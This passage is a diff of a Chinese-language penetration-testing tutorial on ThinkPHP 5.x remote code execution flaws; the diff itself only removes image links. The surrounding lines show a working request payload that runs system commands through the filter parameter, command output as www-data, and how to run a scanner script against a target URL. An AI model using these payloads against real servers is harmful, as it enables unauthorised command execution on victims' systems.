@@ -49,17 +49,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ifconfig
 ```
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_5.png)
 
 通过这种方式，攻击者可以在目标服务器上执行任意系统命令。
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_7.png)
 
 ---
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_8.png)
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_10.png)
 
 ## ⚙️ ThinkPHP 5.0.2 远程代码执行漏洞
 
@@ -67,24 +63,20 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ifconfig
 
 该漏洞的成因是程序没有正确处理控制器名。在网站未开启强制路由的默认配置下，攻击者可以调用任意方法，从而导致远程命令执行漏洞。
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_12.png)
 
 ### 自动化检测与利用
 由于ThinkPHP 5.x版本存在多个变种的Payload，手动测试效率较低。因此，我们可以使用自动化脚本进行批量检测。
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_14.png)
 
 以下是推荐的检测步骤：
 1.  寻找或编写针对ThinkPHP漏洞的扫描脚本。
 2.  使用脚本对目标URL进行测试，脚本会尝试多个已知的Payload。
 3.  根据脚本反馈的结果，判断漏洞是否存在并获得可用的Payload。
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_16.png)
 
 ### 脚本使用演示
 假设我们有一个名为`thinkphp_rce.py`的Python扫描脚本。
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_18.png)
 
 在命令行中，使用以下格式运行脚本：
 ```bash
@@ -92,7 +84,6 @@ python thinkphp_rce.py -u http://target.com:8090
 ```
 其中，`http://target.com:8090` 是待检测的目标地址。
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_20.png)
 
 脚本运行后，如果发现漏洞，会输出类似以下信息：
 ```
@@ -101,7 +92,6 @@ python thinkphp_rce.py -u http://target.com:8090
 ```
 这表示目标存在漏洞，并给出了一个可以执行`id`命令的Payload。
 
-![](img/de94a111d854dcf9b82bd2056b216ec7_22.png)
 
 我们可以直接访问这个构造好的URL，例如：
 ```
